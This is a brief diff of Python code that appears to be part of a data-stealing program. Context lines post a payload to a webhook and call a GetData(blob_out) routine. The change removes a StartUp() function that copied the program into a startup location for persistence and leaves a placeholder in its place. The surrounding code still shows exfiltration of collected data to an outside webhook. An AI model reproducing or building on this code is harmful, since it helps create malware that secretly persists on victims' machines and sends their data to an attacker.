@@ -87,15 +87,8 @@ response = requests.post(webhook, json=payload3)
 
 
 def StartUp():
-    try:
-        shutil.copy2(argv[0], startup_loc)
-    except Exception:
-        try:
-            shutil.copy2(argv[0], startup_loc)
-        except Exception:
-            pass
-
-StartUp()
+    #Will do after
+    pass
 
 
 def GetData(blob_out):
